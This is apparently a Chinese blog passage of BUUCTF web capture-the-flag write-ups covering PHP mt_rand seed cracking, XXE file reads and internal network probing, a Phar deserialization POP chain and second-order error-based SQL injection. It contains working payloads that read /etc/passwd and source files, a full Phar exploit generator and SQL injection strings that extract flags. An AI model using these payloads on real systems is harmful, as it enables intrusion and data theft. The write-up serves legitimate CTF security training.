┌──(kali㉿kali)-[~/Desktop/php_mt_seed-4.0]
└─$ ./php_mt_seed 2 2 0 61 7 7 0 61 2 2 0 61 53 53 0 61 14 14 0 61 28 28 0 61 48 48 0 61 19 19 0 61 42 42 0 61 35 35 0 61        
Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62
Version: 3.0.7 to 5.2.0
Found 0, trying 0xfc000000 - 0xffffffff, speed 1526.3 Mseeds/s 
Version: 5.2.1+
Found 0, trying 0x0e000000 - 0x0fffffff, speed 61.6 Mseeds/s 
seed = 0x0f8bea05 = 260827653 (PHP 7.1.0+)
Found 1, trying 0xfe000000 - 0xffffffff, speed 57.9 Mseeds/s 
Found 1

```



那么利用给好的源码自己把完整的串生成出来:

```php
<?php

mt_srand(260827653);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}

echo $str;
?>
chcRo2MtG9M6I3roNmwa
```



<img src="/images/buuctf-web2/image-20221026114918358.png" alt="image-20221026114918358" style="zoom:67%;" />



<br>

***

<br>



# [XXE,爆破内网网段]True XML cookbook

![image-20221026123210924](/images/buuctf-web2/image-20221026123210924.png)





```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[                                                 
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php">
]>

<user><username>&xxe;</username><password>124</password></user>
```

输出一下`doLogin`的源码:

```php
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = 'admin'; //账号
$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```

这里获取了登录的账号密码, 能够登录成功, 但是并没有什么用



读取以下敏感文件,看看有没有线索:

`/etc/passwd`

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[                                                 
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<user><username>&xxe;</username><password>333</password></user>

```

`/proc/net/arp`: 看一下其他的内网主机

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[                                                 
<!ENTITY xxe SYSTEM "file:///proc/net/arp">
]>

<user><username>&xxe;</username><password>333</password></user>
```

<img src="/images/buuctf-web2/image-20221026143315937.png" alt="image-20221026143315937" style="zoom:67%;" />



`/etc/hosts`:

<img src="/images/buuctf-web2/image-20221026141936123.png" alt="image-20221026141936123" style="zoom:67%;" />



`/proc/net/fib_trie`路由缓存<img src="/images/buuctf-web2/image-20221026142234341.png" alt="image-20221026142234341" style="zoom:67%;" />

上面发现的两个可疑IP,使用php协议来读取一下:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[                                                 
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://10.244.80.130">
]>
```

<img src="/images/buuctf-web2/image-20221026142509275.png" alt="image-20221026142509275" style="zoom:67%;" />

`10.128.253.12`没有响应

解码出来发现只是登录页面的源码..

这里需要使用burpsuite的`intruder`模块对内网所在的网段进行爆破:

<img src="/images/buuctf-web2/image-20221026152052357.png" alt="image-20221026152052357" style="zoom:67%;" />

payload就设置为1-255  (这里没有找到burpsuite怎么设置请求的超时时间,爆破得很慢很慢..)

<img src="/images/buuctf-web2/image-20221026152026476.png" alt="image-20221026152026476" style="zoom:67%;" />



<br>

***

<br>

# [Phar反序列化,pop链]Dropbox



注册账号登录后上传文件, 这里上传一个php文件后提示只允许上传图片类文件

![image-20221026155802018](/images/buuctf-web2/image-20221026155802018.png)

上传文件之后发现能够下载, 点击后会跳转到`download.php`来下载,并通过post中的`filename`来传文件名

那么直接下载`index.php`和`download.php`(开始不知道在哪个目录,就在文件名前面加`../`直到能够下载)

<img src="/images/buuctf-web2/image-20221026155953438.png" alt="image-20221026155953438" style="zoom:67%;" />

`index,php`中还包含了`class.php`,也下载下来

```php
<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```

`download.php`:

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp"); //限制php函数可读写文件的范围

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```

`class.php`:

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) { # 登录后进去看到的那个文件列表
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path); # 扫描文件目录,得到包括所有文件名的数组

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]); # 删除上面数组中的"." 和 ".."

        foreach ($filenames as $filename) {
            $file = new File();  # 对每一个文件创建一个File对象
            $file->open($path . $filename); # 调用后面file的open方法,检测其是否存在和是否为目录
            array_push($this->files, $file); # 将当前这个file对象加入 files数组中
            $this->results[$file->name()] = array(); 
        }
    }

    public function __call($func, $args) { 
        //调用__call时,根据传入的func,就会让$files中所有的file调用这个func,并把结果存入results
        array_push($this->funcs, $func); //将func加入funcs
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func(); # 将每个file调用func方法的结果存入result数组中
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            } //这里会将file执行func的结果输出
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

`delete.php`:

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```



这里由于`download`中有`ini_set("open_basedir", getcwd() . ":/etc:/tmp");` 限制, 无法读取文件

所以这里利用`delete.php`

这里如果`POST`传的`filename`参数为`phar://xxx` 这里`xxx`是我们上传好的一个`phar`文件, 第17行的`open($filename)`处就会触发反序列化. 

再换个角度看, 我们最终的目的是通过`File`类的`close`方法来读取`/flag.txt`, 那么在我们构造类对象的时候, `File`类的这个对象的`Filename`属性的值就得是`'/flag.txt'`

然后如何触发`File`类的`close`方法呢, 这里注意到`FileList`类存在`__call`方法,这个方法会在调用一个本类不存在的方法时被调用

而这里在`FileList`类`__call`方法中, 会让其`files`中(这个属性是一个列表,里面存储了若干`File`类的对象)每个`file`对象来调用这个不存在的方法`__call($func, $args)`这里的参数`func`就是这个被调用的本类不存在的方法

然后`__call`方法还会将每个`file`对象的执行结果存入`result`中(89行)

在`FileList`类的`__destruct()`方法中, 会将`result`中的内容显示出来

那么我们就需要让`FileList`类的对象来调用`close()`方法,这里在`user`类中有:

```
    public function __destruct() {
        $this->db->close();
    }
```

这里的`db`本来是用来操作数据库的,那么我们可以把 `user`的`db`属性指定为一个`FileList`类的对象,这样当这个`user`类的一个对象被反序列化并执行上面的 `__destruct()`时, 它实际上就让它内部的这个`FileList`类的对象执行了`close`方法

综上, `user`为最外层的类,也就是直接被`phar`反序列化的类,那么现在就可以着手构建这个`phar`文件了:

```php
<?php

class User {
    public $db;
}
class File {
    public $filename;
}
class FileList {
    private $files;
    public function __construct() { 
        $file = new File();
        $file->filename = "/flag.txt";
        $this->files = array($file);
    }
}
$a = new User();
$b = new FileList();
$a->db = $b;
//构建phar文件:
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($a);
$phar->addFromString("test.txt", "aaaaa");
$phar->stopBuffering();
?>
```

运行上面的代码, 生成一个`phar`文件:`phar.phar`,然后将其后缀名改为jpg后上传,在访问`delete.php`时如下传参就能够触发反序列化了

![image-20221026195251664](/images/buuctf-web2/image-20221026195251664.png)



<br>

***

<br>

# [二次注入,报错注入,SQL正则]EasySQL



这里试了好久,最后发现注册用户时, 用户名用`aaa"`,然后再修改密码页面才会有注入点

这里先不输入新旧密码,直接点`submit`会报错:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"aaa"" and pwd='7e3b7a5bafcb0fa8e8dfe3ea6aca9186'' at line 1
```

那么这里猜测修改密码的语句就差不多是:

```
update....... where name=username and pwd=oldpass 
这里由于我们的用户名是aaa" 所以会在name=username那里提前闭合产生了报错,那么注入点就在这里
```

这里只会回显报错信息,所以试一试报错注入

回到注册页面,用下面的payload作用户名(这里一开始有`and`和空格会被检测出来,所以换成`&&`和括号)

```
111"&&(updatexml(1,concat(0x7e,(select(user())),0x7e),1))#
```

来到修改密码页面, 随便输入两个新旧密码后点击提交:

![image-20221026211149576](/images/buuctf-web2/image-20221026211149576.png)

那么接下来按部就班地挖掘信息就可以了

库名:

```
注册username: a"&&extractvalue(1,concat(0x7e,(database()),0x7e))#
输出: XPATH syntax error: '~web_sqli~' 
```

表名: 

```
注册:b"&&(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=database())),0x7e),1))#
输出:XPATH syntax error: '~article,flag,users~'
```

列名:

```
注册c"&&(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)=('flag'))),0x7e),1))#
输出:XPATH syntax error: '~flag~'
```

数据:

```
d"&&(updatexml(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e),1))#
XPATH syntax error: '~RCTF{Good job! But flag not her'
.....
```

重新查一下别的表:

```
注册e"&&(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)=('users'))),0x7e),1))#
输出:
XPATH syntax error: '~name,pwd,email,real_flag_1s_her'
!!!!!
```

数据:

```
注册: g"&&(updatexml(1,concat(0x7e,(select(group_concat('real_flag_1s_here'))from(users)),0x7e),1))#

这里会输出一堆垃圾数据,显示不全,为了让其输出真正地flag,需要用一下模糊查询,但这里like被过滤了
使用regexp正则匹配,下面where((real_flag_1s_here)regexp('^flag')) 表示匹配以flag为开头的串

g"&&(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp('^flag'))),0x7e),1))#
输出:flag{b0b943b3-0d22-4668-93da-01   

使用reverse逆序再输出一波:
g"&&(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp('^flag')))),0x7e),1))#
XPATH syntax error: '~}cbf5fd765010-ad39-8664-22d0-3b'

拼接起来:
flag{b0b943b3-0d22-4668-93da-010567df5fbc} 
```



















